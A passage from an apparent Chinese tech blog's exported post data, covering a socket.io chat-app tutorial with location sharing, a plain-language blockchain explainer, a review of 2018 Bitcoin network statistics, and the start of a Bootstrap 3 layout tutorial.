require('http');const express = require('express');const socketIO = require('socket.io');const &#123;generateMessage&#125; = require('./utils/message');const publicPath = path.join(__dirname, '../public');const port = process.env.PORT || 3000;var app = express();var server = http.createServer(app);var io = socketIO(server);app.use(express.static(publicPath));io.on('connection', (socket) =&gt; &#123; console.log('New user connected'); socket.emit('newMessage', generateMessage('Admin', 'Welcome to the chat app')); socket.broadcast.emit('newMessage', generateMessage('Admin', 'New user joined')); socket.on('createMessage', (message, callback) =&gt; &#123; console.log('createMessage', message); io.emit('newMessage', generateMessage(message.from, message.text)); callback('This is from the server.'); //客户端执行回调函数 // socket.broadcast.emit('newMessage', &#123; // from: message.from, // text: message.text, // createdAt: new Date().getTime() // &#125;); &#125;); socket.on('disconnect', () =&gt; &#123; console.log('User was disconnected'); &#125;);&#125;);server.listen(port, () =&gt; &#123; console.log(`Server is up on $&#123;port&#125;`);&#125;); 测试 运行： 1&gt; node server/server.js 分别打开两个浏览器tabs， 打开localhost:3000查看控制台输出的语句。 经纬度 index.js 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051var socket = io();socket.on('connect', function () &#123; console.log('Connected to server');&#125;);socket.on('disconnect', function () &#123; console.log('Disconnected from server');&#125;);socket.on('newMessage', function (message) &#123; console.log('newMessage', message); var li = jQuery('&lt;li&gt;&lt;/li&gt;'); li.text(`$&#123;message.from&#125;: $&#123;message.text&#125;`); jQuery('#messages').append(li);&#125;);jQuery('#message-form').on('submit', function (e) &#123; e.preventDefault(); socket.emit('createMessage', &#123; from: 'User', text: jQuery('[name=message]').val() &#125;, function () &#123; &#125;);&#125;);var locationButton = jQuery('#send-location');locationButton.on('click', function () &#123; if (!navigator.geolocation) &#123; return alert('Geolocation not supported by your browser.'); &#125; navigator.geolocation.getCurrentPosition(function (position) &#123; socket.emit('createLocationMessage', &#123; latitude: position.coords.latitude, longitude: position.coords.longitude &#125;); &#125;, function () &#123; alert('Unable to fetch location.'); &#125;);&#125;); index.html 1234567891011121314151617181920212223242526272829&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt;&lt;/head&gt;&lt;body&gt; &lt;p&gt;Welcome to the chat app&lt;/p&gt; &lt;script src=\"/socket.io/socket.io.js\"&gt;&lt;/script&gt; &lt;script src=\"https://code.jquery.com/jquery-3.3.1.min.js\" integrity=\"sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8=\" crossorigin=\"anonymous\"&gt;&lt;/script&gt;&lt;ol id=\"messages\"&gt;&lt;/ol&gt;&lt;form id=\"message-form\"&gt; &lt;input name=\"message\" type=\"text\" placeholder=\"Message\"/&gt; &lt;button&gt;Send&lt;/button&gt;&lt;/form&gt; &lt;button id=\"send-location\"&gt;Send Location&lt;/button&gt; &lt;script src=\"/js/index.js\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; message.js 123456789var generateMessage = (from, text) =&gt; &#123; return &#123; from, text, createdAt: new Date().getTime() &#125;;&#125;;module.exports = &#123;generateMessage&#125;; server.js 12345678910111213141516171819202122232425262728293031323334353637383940414243444546const path = require('path');const http = require('http');const express = require('express');const socketIO = require('socket.io');const &#123;generateMessage&#125; = require('./utils/message');const publicPath = path.join(__dirname, '../public');const port = process.env.PORT || 3000;var app = express();var server = http.createServer(app);var io = socketIO(server);app.use(express.static(publicPath));io.on('connection', (socket) =&gt; &#123; console.log('New user connected'); socket.emit('newMessage', generateMessage('Admin', 'Welcome to the chat app')); socket.broadcast.emit('newMessage', generateMessage('Admin', 'New user joined')); socket.on('createMessage', (message, callback) =&gt; &#123; console.log('createMessage', message); io.emit('newMessage', generateMessage(message.from, message.text)); callback('This is from the server.'); // socket.broadcast.emit('newMessage', &#123; // from: message.from, // text: message.text, // createdAt: new Date().getTime() // &#125;); &#125;); socket.on('createLocationMessage', (coords) =&gt; &#123; io.emit('newMessage', generateMessage('Admin', `$&#123;coords.latitude&#125;, $&#123;coords.longitude&#125;`)); &#125;); socket.on('disconnect', () =&gt; &#123; console.log('User was disconnected'); &#125;);&#125;);server.listen(port, () =&gt; &#123; console.log(`Server is up on $&#123;port&#125;`);&#125;); 谷歌经纬度 index.js 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061var socket = io();socket.on('connect', function () &#123; console.log('Connected to server');&#125;);socket.on('disconnect', function () &#123; console.log('Disconnected from server');&#125;);socket.on('newMessage', function (message) &#123; console.log('newMessage', message); var li = jQuery('&lt;li&gt;&lt;/li&gt;'); li.text(`$&#123;message.from&#125;: $&#123;message.text&#125;`); jQuery('#messages').append(li);&#125;);socket.on('newLocationMessage', function (message) &#123; var li = jQuery('&lt;li&gt;&lt;/li&gt;'); var a = jQuery('&lt;a target=\"_blank\"&gt;My current location&lt;/a&gt;'); li.text(`$&#123;message.from&#125;: `); a.attr('href', message.url); li.append(a); jQuery('#messages').append(li);&#125;);jQuery('#message-form').on('submit', function (e) &#123; e.preventDefault(); socket.emit('createMessage', &#123; from: 'User', text: jQuery('[name=message]').val() &#125;, function () &#123; &#125;);&#125;);var locationButton = jQuery('#send-location');locationButton.on('click', function () &#123; if (!navigator.geolocation) &#123; return alert('Geolocation not supported by your browser.'); &#125; navigator.geolocation.getCurrentPosition(function (position) &#123; socket.emit('createLocationMessage', &#123; latitude: position.coords.latitude, longitude: position.coords.longitude &#125;); &#125;, function () &#123; alert('Unable to fetch location.'); &#125;);&#125;); index.html 1234567891011121314151617181920212223242526272829&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt;&lt;/head&gt;&lt;body&gt; &lt;p&gt;Welcome to the chat app&lt;/p&gt; &lt;script src=\"/socket.io/socket.io.js\"&gt;&lt;/script&gt; &lt;script src=\"https://code.jquery.com/jquery-3.3.1.min.js\" integrity=\"sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8=\" crossorigin=\"anonymous\"&gt;&lt;/script&gt;&lt;ol id=\"messages\"&gt;&lt;/ol&gt;&lt;form id=\"message-form\"&gt; &lt;input name=\"message\" type=\"text\" placeholder=\"Message\"/&gt; &lt;button&gt;Send&lt;/button&gt;&lt;/form&gt; &lt;button id=\"send-location\"&gt;Send Location&lt;/button&gt; &lt;script src=\"/js/index.js\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; message.js 1234567891011121314151617var generateMessage = (from, text) =&gt; &#123; return &#123; from, text, createdAt: new Date().getTime() &#125;;&#125;;var generateLocationMessage = (from, latitude, longitude) =&gt; &#123; return &#123; from, url: `https://www.google.com/maps?q=$&#123;latitude&#125;,$&#123;longitude&#125;`, createdAt: new Date().getTime() &#125;;&#125;;module.exports = &#123;generateMessage, generateLocationMessage&#125;; server.js 123456789101112131415161718192021222324252627282930313233343536373839404142434445const path = require('path');const http = require('http');const express = require('express');const socketIO = require('socket.io');const &#123;generateMessage,generateLocationMessage&#125; = require('./utils/message');const publicPath = path.join(__dirname, '../public');const port = process.env.PORT || 3000;var app = express();var server = http.createServer(app);var io = socketIO(server);app.use(express.static(publicPath));io.on('connection', (socket) =&gt; &#123; console.log('New user connected'); socket.emit('newMessage', generateMessage('Admin', 'Welcome to the chat app')); socket.broadcast.emit('newMessage', generateMessage('Admin', 'New user joined')); socket.on('createMessage', (message, callback) =&gt; &#123; console.log('createMessage', message); io.emit('newMessage', generateMessage(message.from, message.text)); callback('This is from the server.'); // socket.broadcast.emit('newMessage', &#123; // from: message.from, // text: message.text, // createdAt: new Date().getTime() // &#125;); &#125;); socket.on('createLocationMessage', (coords) =&gt; &#123; io.emit('newLocationMessage', generateLocationMessage('Admin', coords.latitude, coords.longitude)); &#125;); socket.on('disconnect', () =&gt; &#123; console.log('User was disconnected'); &#125;);&#125;);server.listen(port, () =&gt; &#123; console.log(`Server is up on $&#123;port&#125;`);&#125;); 页面优化 css/style.css: 1button,button:hover&#123;border:none;color:#fff;padding:10px&#125;.chat__messages,.chat__sidebar ul&#123;list-style-type:none&#125;*&#123;box-sizing:border-box;margin:0;padding:0;font-family:HelveticaNeue-Light,\"Helvetica Neue Light\",\"Helvetica Neue\",Helvetica,Arial,\"Lucida Grande\",sans-serif;font-weight:300;font-size:.95rem&#125;li,ul&#123;list-style-position:inside&#125;h3&#123;font-weight:600;text-align:center;font-size:1.5rem&#125;button&#123;background:#265f82;cursor:pointer;transition:background .3s ease&#125;button:hover&#123;background:#1F4C69&#125;button:disabled&#123;cursor:default;background:#698ea5&#125;.centered-form&#123;display:flex;align-items:center;height:100vh;width:100vw;justify-content:center;background:-moz-linear-gradient(125deg,rgba(39,107,130,1) 0,rgba(49,84,129,1) 100%);background:-webkit-gradient(linear,left top,right bottom,color-stop(0,rgba(49,84,129,1)),color-stop(100%,rgba(39,107,130,1)));background:-webkit-linear-gradient(125deg,rgba(39,107,130,1) 0,rgba(49,84,129,1) 100%);background:-o-linear-gradient(125deg,rgba(39,107,130,1) 0,rgba(49,84,129,1) 100%);background:-ms-linear-gradient(125deg,rgba(39,107,130,1) 0,rgba(49,84,129,1) 100%);background:linear-gradient(325deg,rgba(39,107,130,1) 0,rgba(49,84,129,1) 100%)&#125;.centered-form__form&#123;background:rgba(250,250,250,.9);border:1px solid #e1e1e1;border-radius:5px;padding:0 20px;margin:20px;width:230px&#125;.form-field&#123;margin:20px 0&#125;.form-field&gt;*&#123;width:100%&#125;.form-field label&#123;display:block;margin-bottom:7px&#125;.form-field input,.form-field select&#123;border:1px solid #e1e1e1;padding:10px&#125;.chat&#123;display:flex&#125;.chat__sidebar&#123;overflow-y:scroll;width:260px;height:100vh;background:-moz-linear-gradient(125deg,rgba(39,107,130,1) 0,rgba(49,84,129,1) 100%);background:-webkit-gradient(linear,left top,right bottom,color-stop(0,rgba(49,84,129,1)),color-stop(100%,rgba(39,107,130,1)));background:-webkit-linear-gradient(125deg,rgba(39,107,130,1) 0,rgba(49,84,129,1) 100%);background:-o-linear-gradient(125deg,rgba(39,107,130,1) 0,rgba(49,84,129,1) 100%);background:-ms-linear-gradient(125deg,rgba(39,107,130,1) 0,rgba(49,84,129,1) 100%);background:linear-gradient(325deg,rgba(39,107,130,1) 0,rgba(49,84,129,1) 100%)&#125;.chat__footer,.chat__sidebar li&#123;background:#e6eaee;padding:10px&#125;.chat__sidebar h3&#123;color:#e6eaee;margin:10px 20px;text-align:left&#125;.chat__sidebar li&#123;border:1px solid #e1e1e1;border-radius:5px;margin:10px&#125;.chat__main&#123;display:flex;flex-direction:column;height:100vh;width:100%&#125;.chat__messages&#123;flex-grow:1;overflow-y:scroll;-webkit-overflow-scrolling:touch;padding:10px&#125;.chat__footer&#123;display:flex;flex-shrink:0&#125;.chat__footer form&#123;flex-grow:1;display:flex&#125;.chat__footer form *&#123;margin-right:10px&#125;.chat__footer input&#123;border:none;padding:10px;flex-grow:1&#125;.message&#123;padding:10px&#125;.message__title&#123;display:flex;margin-bottom:5px&#125;.message__title h4&#123;font-weight:600;margin-right:10px&#125;.message__title span&#123;color:#999&#125;@media (max-width:600px)&#123;*&#123;font-size:1rem&#125;.chat__sidebar&#123;display:none&#125;.chat__footer&#123;flex-direction:column&#125;.chat__footer form&#123;margin-bottom:10px&#125;.chat__footer button&#123;margin-right:0&#125;&#125; index.js 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465var socket = io();socket.on('connect', function () &#123; console.log('Connected to server');&#125;);socket.on('disconnect', function () &#123; console.log('Disconnected from server');&#125;);socket.on('newMessage', function (message) &#123; console.log('newMessage', message); var li = jQuery('&lt;li&gt;&lt;/li&gt;'); li.text(`$&#123;message.from&#125;: $&#123;message.text&#125;`); jQuery('#messages').append(li);&#125;);socket.on('newLocationMessage', function (message) &#123; var li = jQuery('&lt;li&gt;&lt;/li&gt;'); var a = jQuery('&lt;a target=\"_blank\"&gt;My current location&lt;/a&gt;'); li.text(`$&#123;message.from&#125;: `); a.attr('href', message.url); li.append(a); jQuery('#messages').append(li);&#125;);jQuery('#message-form').on('submit', function (e) &#123; e.preventDefault(); socket.emit('createMessage', &#123; from: 'User', text: jQuery('[name=message]').val() &#125;, function () &#123; &#125;);&#125;);var locationButton = jQuery('#send-location');locationButton.on('click', function () &#123; if (!navigator.geolocation) &#123; return alert('Geolocation not supported by your browser.'); &#125; locationButton.attr('disabled', 'disabled').text('Sending location...'); navigator.geolocation.getCurrentPosition(function (position) &#123; locationButton.removeAttr('disabled').text('Send location'); socket.emit('createLocationMessage', &#123; latitude: position.coords.latitude, longitude: position.coords.longitude &#125;); &#125;, function () &#123; locationButton.removeAttr('disabled').text('Send location'); alert('Unable to fetch location.'); &#125;);&#125;);","categories":[],"tags":[]},{"title":"【区块链】给自己的妈妈解释什么是区块链(1)","slug":"explication-bitcoin","date":"2018-12-30T02:47:15.000Z","updated":"2019-04-28T02:47:09.377Z","comments":true,"path":"2018/12/30/explication-bitcoin/","link":"","permalink":"https://dreamerjonson.com/2018/12/30/explication-bitcoin/","excerpt":"","text":"一般人都听说过区块链的概念，即便是网络上充斥着大量有关区块链的文章，区块链对于大部分人来说也是非常朦胧的。这其实不能怪读者，因为区块链本身是一个非常庞大的概念，它是一个革命性的系统，它非常复杂、发展迅速并且拥有非常陡峭的学习曲线。 在本文以及接下来的一系列文章中，笔者试图用生动又不失内涵的语言为大家揭开区块链的神秘面纱。希望你也能给你的妈妈解释清楚，到底什么是区块链。😃 原始社会 在原始社会当中的交易,jonson要到olaya处买一头牛，jonson给了olaya一百元钱，因为是面对面的交易，交易双方都能够明确对方是指定的交易人，而不是李四、王二麻子…并且Alice能够验证到这头牛是真的，Bob能够验证到这笔钱不是伪造的。在这样的社会中，一切运转良好。 陶渊明曾经写过《桃花源记》，在桃花源这样的良田美池桑竹之属之地，每一个人都可以安居乐业、怡然自得。其实，从现代的博弈论的角度来讲，这种社会是可能存在的。因为，在封闭的信任社会当中，jonson欺骗的代价是非常之高的，甚至高到jonson没有办法承受。因为任何一次欺骗都可能会失去jonson在封闭社会当中生存下去的可能性。因此在封闭的小范围的环境下，维持信任的成本是比较低的。 图1 原始社会 现代社会 当今社会的交易是跨空间甚至于跨时间的。资源开始在全世界内进行交换和配置。现在交易的另一方可能远在世界的另外一端。如何还能够保证跟我交易的人不是一个骗子、而是我真正希望进行交易的伙伴？ 如果jonson给olaya的100元钱现在是一串数字，olaya如何能够保证jonson在支付给自己前已经将这笔钱发送给了其他人？就跟发送电子邮件一样，如何能够保证这笔数字没有被拷贝多份？为了解决上面提到的信任问题，现如今，我们需要借助于银行或者中央银行，借助支付宝微信等第三方平台。在国外有visa、paypal信用卡组织来创建信任。第三方组织保留自己的私人账簿，存储每个帐户的交易历史记录和余额。如果jonson向olaya发送100元，那么第三方组织将从jonson的账户中扣除100元，并在olaya的账户中增加100元。首先，借助第三方组织创建信任的代价是非常昂贵的。比如一家银行需要有各地的营业网点、场地。需要有律师、以及昂贵的高级管理人员。中央银行可能会乱发钞票带来通货膨胀、商业银行随意借贷资金带来整个社会的危机。另一方面，中心化的服务器会带来严重的安全问题。黑客袭击事件不胜枚举如不久前的facebook图片泄露。 图2 现代社会 区块链社会 2008年，正当金融危机席卷世界之际、人们开始反思当前的社会、金融秩序所面临的问题。2008年11月，一位化名为“ 中本聪&quot; 的研究者在密码学邮件组中发表了比特币的奠基性论文《比特币：一种点对点式的电子现金系统》（Bitcoin: A Peer-to-Peer Electronic Cash System）的论文。其在2008年8月还注册了bitcoin.org域名。在比特币白皮书中，中本聪描述了一种被他称为“比特币”的电子货币。为我们观察金钱的方式带来革命性的变化。中本聪等人希望打造一个系统，它不需要借助于任何第三方的组织或者权威的中心组织，任何人都能够拥有唯一标示的一串地址来对应特定的交易人。同时这个系统能够保证资金没有被反复使用，例如jonson既然给了olaya 100元，就不能够再次将这同样的100元转移给steven。在这样的系统中，任何人都可以参与到其中，即便系统中存在潜在的骗子，系统也能保证每一笔交易的安全性。 图3 区块链 第一个比特币在2009年1月发行。中本聪在创世区块中写下了这样一段英文：Chancellor on brink of second bailout for banks（财政部长批准对于银行的第二轮援助贷款）。这句泰晤士报上的一句话正是为了嘲讽08年的金融危机。像比特币这样的分布式网络，没有单一的攻击点。每个人都有一份分类账（区块链），没有人必须信任第三方组织，因为任何人都可以直接验证区块链中的信息。 总结 从原始社会、现代社会再到区块链社会，人类社会总是在不断提高效率中前进。笔者揭示了区块链诞生的历史及其产生的必然性。 如何在无信任的社会（有恶意的欺骗）中建立一种共识，确实是人类几十年来面临的难题。难在： 1、在互联网上的数字，和邮箱一样，我们就很难避免其他人复制N份。 2、由于每个人分散在各地，不能够保证每个人都同时在线。可以会有意外的离线、断线。 3、不能保证在这个系统中存在故意的破坏者。 中本聪关于区块链的精巧设计打开了新世界的大门。在比特币中、使用了分布式账本、p2p网络、数字签名、POW共识算法、区块链等精彩的设计。 结合了现代密码学、应用数学、计算机科学最新成果的比特币网络解决了人类几十年来难以解决的信任问题。信任带来社会的交易成本的降低，效率的提升带来社会的深刻变革。","categories":[{"name":"区块链","slug":"区块链","permalink":"https://dreamerjonson.com/categories/区块链/"}],"tags":[{"name":"区块链","slug":"区块链","permalink":"https://dreamerjonson.com/tags/区块链/"}]},{"title":"【区块链】2018全年比特币网络重要指标图表分析","slug":"2018-bitcoin","date":"2018-12-29T06:59:18.000Z","updated":"2018-12-30T16:12:31.961Z","comments":true,"path":"2018/12/29/2018-bitcoin/","link":"","permalink":"https://dreamerjonson.com/2018/12/29/2018-bitcoin/","excerpt":"","text":"前言 2018年对于区块链、对于数字货币市场来说注定是不平凡的一年。年初，随着比特币、以太币等数字货币价格飙升,区块链得到了世界上越来越多人的关注。在之后，随着主流数字货币价格的暴跌，市场陷入一片哀嚎。然而，数字价格的波动并没有影响到区块链生态的繁荣。同时，对于金融的重塑不过是区块链强大特性的冰山一角。主流社会逐渐意识到，区块链技术将深刻的改变人类社会。 作为区块链鼻祖的比特币是一个革命性的系统，它非常复杂并且拥有非常陡峭的学习曲线。比特币常常作为市场的风向标。它不仅占领了数字货币总价值的半壁江山，也非常直接地影响了其他数字货币的价格。在这片文章中，笔者将会对2018年比特币网络的重要指标进行回顾。有一些概念可能读者闻所未闻。但是不管知不知道，它就在那里… 加密货币总市值 2018年，加密货币总市值从年初的8285亿美元下降到1300亿美元 图1 加密货币总市值 比特币总占比 2018年，比特币在加密货币中的总市值占比从年初最低的32.15%上升到第四季度50%以上 图2 比特币总占比 交易费用 2018年，比特币网络支付给矿工的费用从年初每天12,000,000美元下降到仅仅110,000美元。 图3 矿工收取的交易费用 交易额 2018年，比特币交易额超过4100亿元（ removing likely change outputs） 平均每秒钟交易13000美元 图4 比特币交易额 数据大小 2018年，比特币的总大小从150G增加到了198G。同比增长率从1月份40%跌落到25%。 图5 比特币数据大小 算力 &amp;&amp; 困难度 2018年，尽管比特币价格大幅下降导致许多矿工由于无利可图而退出，但比特币的算力在2018年期间仍然从从每秒19phash/s增加到38phash/s。据统计，如果一个黑客拥有当前全网所有的算力，重写全部比特币区块链的时间大约需要270天。 图6 比特币算力增长 信息传递 2018年，比特币区块传播速度明显提升，区块平均两秒钟即可传播到全网90%以上的节点。 图7 区块传播速度 下面是一些比较专业的概念，某些读者可能完全不懂这些数据背后的含义。 UTXO大小 比特币未花费的输出（UTXO）大小从62M减少到50M，平均每2.6秒减少一个UTXO。然而在2017年，每2秒钟就会增加一个UTXO。 图8 UTXO大小 交易输出 BTC交易输出（output）总数从3M BTC /天的峰值下降到1M BTC/天 图9 交易输出的比特币数量 每日比特币交易输出（output）在1月达到峰值1,247,000，并在2018年剩余时间内稳定在500,000和600,000之间。 图10 交易输出个数 交易大小 virtual bytes（vbyte）单位用于衡量比特币中交易在区块中的大小。交易从1月 750 vbyte的峰值下降到了450 vbyte。 这是比特币隔离验证采用率逐渐增加的结果。 图11 比特币区块中交易的大小 AsicBoost AsicBoost是一种创新，通过改变计算区块头哈希的方式，号称可以将挖矿的效率提高20%，2018年，每日使用Overt AsicBoost方式挖出的区块从0%上升到了31%。 图12 AsicBoost挖矿 OP_RETURN OP_RETURN可用于在区块链上存储任意数据。2018年OP_RETURN输出的数量大小从4M增加到10M，OP_RETURN从2017年每天增长约50到2018年每天增长300个以上。 图13 OP_RETURN输出 闪电网络 作为比特币扩容方案的闪电网络通道从0增加到了20101个，处理比特币能力从0增加到了522个。 图14 闪电网络通道与金额变化 总结 1、2018年整个加密货币市值相比年初下跌了84%，但比特币所占市值总权重却上升到了四季度的50%以上。比特币仍然是加密货币世界的半壁江山、中流砥柱。 2、比特币交易数量与交易金额从1月份峰值开始回落并稳定下来。这直接导致了比特币数据量增速放缓，矿工交易费用收益降低。尽管如此，比特币总交易额仍然超过4100亿元，平均每秒钟交易13000美元 3、尽管比特币价格大幅下降导致许多矿工由于无利可图而退出，比特币算力仍然在2018年期间仍然从从每秒19phash/s增加到38phash/s 4、关于比特币的许多创新都在加速。包括比特币扩容方案——闪电网络、隔离验证，AsicBoost挖矿，OP_RETURN等。 参考资料 https://p2sh.info/ https://coin.dance https://statoshi.info/ https://www.blockchain.com https://asicboost.dance/ https://coinmarketcap.com/charts/","categories":[{"name":"区块链原理","slug":"区块链原理","permalink":"https://dreamerjonson.com/categories/区块链原理/"}],"tags":[{"name":"区块链原理","slug":"区块链原理","permalink":"https://dreamerjonson.com/tags/区块链原理/"}]},{"title":"bootstrap详解","slug":"bootstrap3-install","date":"2018-12-27T10:26:45.000Z","updated":"2019-01-10T09:29:36.445Z","comments":true,"path":"2018/12/27/bootstrap3-install/","link":"","permalink":"https://dreamerjonson.com/2018/12/27/bootstrap3-install/","excerpt":"","text":"网址 bootstrap官网：https://getbootstrap.com bootstrap4文档：https://getbootstrap.com/docs 高版本右上方可以切换到低版本。 bootstrap3文档:https://getbootstrap.com/docs/3.3/ bootstrap4 相对于bootstrap3的改变：https://getbootstrap.com/docs/4.2/migration/ bootstrap github:https://github.com/twbs/bootstrap 安装bootstrap css 使用bootstrap方式： 方式1：链接外部库 https://www.bootstrapcdn.com/legacy/bootstrap/ 12345678910&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;BootStrap&lt;/title&gt; &lt;link href=\"https://stackpath.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css\" rel=\"stylesheet\" integrity=\"sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u\" crossorigin=\"anonymous\"&gt;&lt;/head&gt;&lt;body&gt; &lt;button type=\"button\" class=\"btn btn-primary\"&gt;Primary&lt;/button&gt;&lt;/body&gt;&lt;/html&gt; 方式2：下载源文件，并link 1&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;bootstrap.css&quot;&gt; 实验 1、实验jumbotron 2、实验多行表单与form-inline一行表单 form-group添加一些属性 form-control让输入框扩展一行显示 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;BootStrap&lt;/title&gt; &lt;link href=\"https://stackpath.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css\" rel=\"stylesheet\" integrity=\"sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u\" crossorigin=\"anonymous\"&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"bootstrap.css\"&gt;&lt;/head&gt;&lt;body&gt; &lt;div class = \"container\"&gt; &lt;button type=\"button\" class=\"btn btn-primary\"&gt;Primary&lt;/button&gt; &lt;div class=\"jumbotron\"&gt; &lt;h1&gt;Hello, world!&lt;/h1&gt; &lt;p&gt;...&lt;/p&gt; &lt;p&gt;&lt;a class=\"btn btn-primary btn-lg\" href=\"#\" role=\"button\"&gt;Learn more&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;&lt;form&gt; &lt;div class=\"form-group\"&gt; &lt;label for=\"exampleInputEmail1\"&gt;Email address&lt;/label&gt; &lt;input type=\"email\" class=\"form-control\" id=\"exampleInputEmail1\" placeholder=\"Email\"&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label for=\"exampleInputPassword1\"&gt;Password&lt;/label&gt; &lt;input type=\"password\" class=\"form-control\" id=\"exampleInputPassword1\" placeholder=\"Password\"&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label for=\"exampleInputFile\"&gt;File input&lt;/label&gt; &lt;input type=\"file\" id=\"exampleInputFile\"&gt; &lt;p class=\"help-block\"&gt;Example block-level help text here.&lt;/p&gt; &lt;/div&gt; &lt;div class=\"checkbox\"&gt; &lt;label&gt; &lt;input type=\"checkbox\"&gt; Check me out &lt;/label&gt; &lt;/div&gt; &lt;button type=\"submit\" class=\"btn btn-default\"&gt;Submit&lt;/button&gt;&lt;/form&gt; &lt;form class=\"form-inline\"&gt; &lt;div class=\"form-group\"&gt; &lt;label for=\"exampleInputName2\"&gt;Name&lt;/label&gt; &lt;input type=\"text\" class=\"form-control\" id=\"exampleInputName2\" placeholder=\"Jane Doe\"&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label for=\"exampleInputEmail2\"&gt;Email&lt;/label&gt; &lt;input type=\"email\" class=\"form-control\" id=\"exampleInputEmail2\" placeholder=\"jane.doe@example.com\"&gt; &lt;/div&gt; &lt;button type=\"submit\" class=\"btn btn-default\"&gt;Send invitation&lt;/button&gt;&lt;/form&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 导航栏 第一步，添加前方navbar-header头部 1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;BootStrap&lt;/title&gt; &lt;link href=\"https://stackpath.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css\" rel=\"stylesheet\" integrity=\"sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u\" crossorigin=\"anonymous\"&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"bootstrap.css\"&gt;&lt;/head&gt;&lt;body&gt; &lt;nav class=\"navbar navbar-default\"&gt; &lt;div class=\"container\"&gt; &lt;div class=\"navbar-header\"&gt; &lt;a class=\"navbar-brand\" href=\"#\"&gt;Brand&lt;/a&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 第2步，添加导航栏菜单navbar-nav 1234567891011121314151617181920212223242526&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;BootStrap&lt;/title&gt; &lt;link href=\"https://stackpath.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css\" rel=\"stylesheet\" integrity=\"sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u\" crossorigin=\"anonymous\"&gt;&lt;/head&gt;&lt;body&gt; &lt;nav class=\"navbar navbar-default\"&gt; &lt;div class=\"container\"&gt; &lt;div class=\"navbar-header\"&gt; &lt;a class=\"navbar-brand\" href=\"#\"&gt;Brand&lt;/a&gt; &lt;/div&gt; &lt;ul class=\"nav navbar-nav\"&gt; &lt;li&gt;&lt;a href=\"#\"&gt;About&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"#\"&gt;Contact&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;ul class=\"nav navbar-nav navbar-right\"&gt; &lt;li&gt;&lt;a href=\"#\"&gt;Sign Up&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"#\"&gt;Login&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 菜单栏的缩放 需要使用js，带入bootstrap js 1&lt;script src=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js&quot; integrity=&quot;sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt; bootstrap js需要jquery 1234&lt;script src=&quot;https://code.jquery.com/jquery-2.2.4.js&quot; integrity=&quot;sha256-iT6Q9iMJYuQiMWNd9lDyBUStIq/8PuOW33aOqmvFpqI=&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt; header内添加 缩放button 属性 data-target=&quot;#bs-nav-demo&quot; 意味着点击缩放按钮，显示id为bs-nav-demo的菜单内的内容 1234567891011121314151617181920212223242526272829303132333435363738&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;BootStrap&lt;/title&gt; &lt;link href=\"https://stackpath.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css\" rel=\"stylesheet\" integrity=\"sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u\" crossorigin=\"anonymous\"&gt;&lt;/head&gt;&lt;body&gt; &lt;nav class=\"navbar navbar-default\"&gt; &lt;div class=\"container\"&gt; &lt;div class=\"navbar-header\"&gt; &lt;button type=\"button\" class=\"navbar-toggle collapsed\" data-toggle=\"collapse\" data-target=\"#bs-nav-demo\" aria-expanded=\"false\"&gt; &lt;span class=\"sr-only\"&gt;Toggle navigation&lt;/span&gt; &lt;span class=\"icon-bar\"&gt;&lt;/span&gt; &lt;span class=\"icon-bar\"&gt;&lt;/span&gt; &lt;span class=\"icon-bar\"&gt;&lt;/span&gt; &lt;/button&gt; &lt;a class=\"navbar-brand\" href=\"#\"&gt;Brand&lt;/a&gt; &lt;/div&gt; &lt;ul 